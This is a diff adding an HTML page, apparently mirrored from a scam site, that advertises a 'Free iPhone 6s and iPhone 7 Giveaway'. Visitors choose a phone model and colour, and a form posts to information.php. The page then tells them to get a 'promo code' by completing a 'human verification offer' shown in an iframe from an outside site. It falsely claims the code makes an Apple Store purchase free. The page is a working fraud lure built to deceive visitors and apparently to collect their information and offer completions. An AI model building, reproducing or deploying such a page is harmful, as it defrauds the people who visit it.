@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+
+
+<!-- Mirrored from demo-oconer.zxc.pm/Demo Fb Get Iphone/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 31 Jan 2017 05:22:01 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<head>
+<meta charset="utf-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Free iPhone 6s and iPhone 7 Giveaway</title>
+<link href="src/A.bootstrap.css%2bother.css%2cMcc.6MIzpK40_v.css.pagespeed.cf.cRNCzZyUCr.css" rel="stylesheet" />
+<link rel="shortcut icon" type="image/png" href="src/xicon.png.pagespeed.ic.VV02hBKwLj.html" />
+<script src="src/jquery.min.js.pagespeed.jm.YSzgc-BSX9.js"></script>
+<script src="src/bootstrap.js.pagespeed.jm.Socw9eI3Bz.js"></script>
+<script>//<![CDATA[
+var size=1;var color=1;var provider=1;function s()
+{if(color==1)
+{document.getElementById('phone').src="img/6/silver.png";}
+if(color==2)
+{document.getElementById('phone').src="img/6/gold.png";}
+if(color==3)
+{document.getElementById('phone').src="img/6/gray.png";}
+document.getElementById("txt").innerHTML="iPhone 6s";size=1;}
+function sp()
+{if(color==1)
+{document.getElementById('phone').src="img/6p/silver.png";}
+if(color==2)
+{document.getElementById('phone').src="img/6p/gold.png";}
+if(color==3)
+{document.getElementById('phone').src="img/6p/gray.png";}
+document.getElementById("txt").innerHTML="iPhone 6s Plus";size=2;}
+function silver()
+{if(size==1)
+{document.getElementById('phone').src="img/6/silver.png";}
+else
+{document.getElementById('phone').src="img/6p/silver.png";}
+color=1;}
+function gold()
+{if(size==1)
+{document.getElementById('phone').src="img/6/gold.png";}
+else
+{document.getElementById('phone').src="img/6p/gold.png";}
+color=2;}
+function gray()
+{if(size==1)
+{document.getElementById('phone').src="img/6/gray.png";}
+else
+{document.getElementById('phone').src="img/6p/gray.png";}
+color=3;}
+function ups()
+{document.getElementById("providertxt").innerHTML="UPS";provider=1;}
+function fedex()
+{document.getElementById("providertxt").innerHTML="FedEx";provider=2;}
+function usps()
+{document.getElementById("providertxt").innerHTML="USPS";provider=3;}
+//]]></script>
+<script>//<![CDATA[
+function disable()
+{document.getElementById('light2').style.display='none';document.getElementById('light3').style.display='none';}
+function img1()
+{document.getElementById('light4').style.display='block';document.getElementById('light5').style.display='none';}
+function img2()
+{document.getElementById('light5').style.display='block';}
+function imgdisable()
+{document.getElementById('light4').style.display='none';document.getElementById('light5').style.display='none';}
+function readme()
+{document.getElementById('light3').style.display='block';}
+//]]></script>
+<script>//<![CDATA[
+function gostep2(){var s1=document.getElementById("step1");s1.parentNode.removeChild(s1);document.getElementById('step2').style.display="block";}
+function gostep3(){var s2=document.getElementById("step1");s2.parentNode.removeChild(s2);document.getElementById('step3').style.display="block";}
+//]]></script>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /></head>
+<body cz-shortcut-listen="true">
+<div id="light" class="white_content">
+</div>
+<div class="overlay" id="light2" style="display: none;">
+</div>
+<nav class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+<div class="container">
+<div class="navbar-header"><img style="padding-top:12px;" src="src/logowhite.svg" /><a class="navbar-brand"></a></div> <a class="navbar-brand">iPhone 6s and iPhone 6s Plus Giveaway</a>
+</div>
+</nav>
+<hr />
+<div class="container">
+<div class="row">
+<div class="col-xs-6 visible-xs-block">
+<img id="phone" src="src/xsilver.png.pagespeed.ic.ky4ZCkzTYX.jpg" />
+</div>
+<div class="col-xs-6">
+<h2 class="header" id="txt">iPhone 6s</h2>
+<p class="sub">Get your own right now</p>
+<hr />
+<div id="step1">
+<p class="steps">Choose a model</p>
+<div class="btn-toolbar" data-toggle="buttons">
+<button onclick="s()" class="btn btn-default active"><input type="radio" name="options" id="option1" autocomplete="off" checked="" />iPhone 6s <br /> 4.7-inch display</button>
+<button onclick="sp()" class="btn btn-default"><input type="radio" name="options" id="option2" autocomplete="off" />iPhone 6s Plus <br /> 5.5-inch display</button>
+</div>
+<p class="steps space">Choose a finish</p>
+<div class="btn-toolbar" data-toggle="buttons">
+<button onclick="silver()" class="btn btn-default active"><input type="radio" name="options" id="option1" autocomplete="off" checked="" /><img src="src/silver%2c281%2c29.png.pagespeed.ce.2dnwIrKluE.png" /><br />Silver</button>
+<button onclick="gold()" class="btn btn-default"><input type="radio" name="options" id="option2" autocomplete="off" /><img src="src/gold.png.pagespeed.ce.IlTRRlyyMW.png" /><br />Gold</button>
+<button onclick="gray()" class="btn btn-default"><input type="radio" name="options" id="option2" autocomplete="off" /><img src="src/xgray.png.pagespeed.ic.OLikEntTC9.png" /><br />Space Gray</button>
+</div>
+<form action="information.php" method="post">
+<center><input type="image" src="http://haboneh.net/userfiles/continue-button.png"></center>
+
+
+<div id="step3" style="display:none;">
+<p class="steps">Promo Code</p>
+							<center>
+							<iframe src="http://filetrbute.com/561841" class="list-group-item" scrolling="no" style="width:100%;background-color:rgba(255,255,255,0.4); "></iframe>
+                            </center>
+							<br>
+<p class="steps" style="padding-top:20px;">How do I use this code?</p>
+<ul style="list-style-type:none">
+<li>Step 1 : Get your Promo Code by completing a human verification offer.</li>
+<li>Step 2 : Go to the Apple Store website, choose the phone you want and checkout. <br />(Keep in mind, it must be the same selection as here)</li>
+<li>Step 3 : Once you arrive on <a style="cursor:pointer;" onclick="img1()">this</a> page.<br /> Press "Enter Promo Code" and type in the code you received.</li>
+<li>Step 4 : Press "Apply" and the coupon will be applied.<br /> The phone will now be free, as shown <a style="cursor:pointer;" onclick="img2()">here</a>.</li>
+</ul>
+<div class="overlay" id="light3">
+<div id="readmecontainer">
+<div class="top"><center><h2 class="header" id="txt">Instructions</h2></center></div>
+<div class="content">
+<ul style="list-style-type:none;padding:0px;margin:0px;text-align:left;">
+<li>Step 1 : Get your Promo Code by selecting the button.</li>
+<li>Step 2 : Go to the Apple Store website, select your item and checkout. <br />(Keep in mind, it must be the same selection as here)</li>
+<li>Step 3 : Once you arrive on <a style="cursor:pointer;" onclick="img1()">this</a> page. Press "Enter Promo Code" and type in the code you received.</li>
+<li>Step 4 : Press "Apply" and the coupon will be applied. The phone will now be free, as shown <a style="cursor:pointer;" onclick="img2()">here</a>.</li>
+</ul>
+</div>
+<div class="bottom">
+<center><input type="button" class="btn btn-default" value="Close" onclick="disable()" /></center>
+</div>
+</div>
+</div>
+<div class="overlay" id="light4">
+<div id="imgcontainer">
+<a style="cursor:pointer;" onclick="imgdisable();">
+<img src="src/xstep1.png.pagespeed.ic.0vHSFMVBPR.png" />
+</a>
+</div>
+</div>
+<div class="overlay" id="light5">
+<div id="imgcontainer">
+<a style="cursor:pointer;" onclick="imgdisable();">
+<img src="src/xstep2.png.pagespeed.ic.7zq3uiwXey.png" />
+</a>
+</div>
+</div>
+</div>
+</div>
+</div>
+</div>
+<hr />
+<h2 style="margin-top:0px !important;" id="bottom"><a href="http://">Get an in-depth look at iPhone 6s</a></h2>
+<a style="display:block;text-align:center;font-size:14px;" href="#">Visit the iPhone 6s site ›</a>
+
+</body>
+
+
+<!-- Mirrored from demo-oconer.zxc.pm/Demo Fb Get Iphone/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 31 Jan 2017 05:23:07 GMT -->
+</html>
